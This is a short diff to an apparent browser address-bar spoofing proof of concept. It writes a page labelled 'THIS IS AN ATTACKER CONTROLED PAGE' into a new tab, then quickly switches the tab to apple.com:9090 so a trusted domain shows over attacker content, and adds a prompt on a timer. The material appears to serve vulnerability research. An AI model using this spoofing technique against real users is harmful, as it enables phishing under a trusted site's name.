@@ -46,8 +46,8 @@
         <head><title>testertester</title></head>
         <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center">
           <div>
-            <h1 style="font-size:96px;font-weight:bold;color:red;margin:0 0 30px 0">THIS IS NOT GOOGLE.COM!</h1>
-            <i><p style="font-size:64px;font-weight:bold;color:#007aff;margin:20px 0">*THIS IS ATTACKER CONTROLED PAGE</p></i>
+            <h1 style="font-size:96px;font-weight:bold;color:red;margin:0 0 30px 0">THIS IS NOT APPLE.COM!</h1>
+            <i><p style="font-size:64px;font-weight:bold;color:#007aff;margin:20px 0">*THIS IS AN ATTACKER CONTROLED PAGE</p></i>
           </div>
         </body>
         </html>
@@ -55,13 +55,13 @@
           newTab.document.close();
 
           setTimeout(() => {
-            newTab.location.href = "https://www.google.com/csi";
+            newTab.location.href = "https://apple.com:9090";
           }, 1);
         }
 
         setTimeout(function () {
           const pwd = prompt("ROOT CAUSE");
-        }, 335);
+        }, 350);
       };
     </script>
   </body>
